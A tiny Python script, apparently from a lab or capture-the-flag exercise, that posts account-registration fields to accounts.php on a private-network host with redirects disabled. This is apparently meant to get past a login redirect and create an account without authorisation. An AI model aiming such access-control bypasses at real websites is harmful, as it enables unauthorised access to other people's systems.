import requests

url = "http://10.10.11.104/accounts.php"

data = {
        'username':'aaaaaa',
        'password':'aaaaaa',
        'confirm':'aaaaaa'
        }

r = requests.post(url, data=data, allow_redirects=False)

print(r.text)
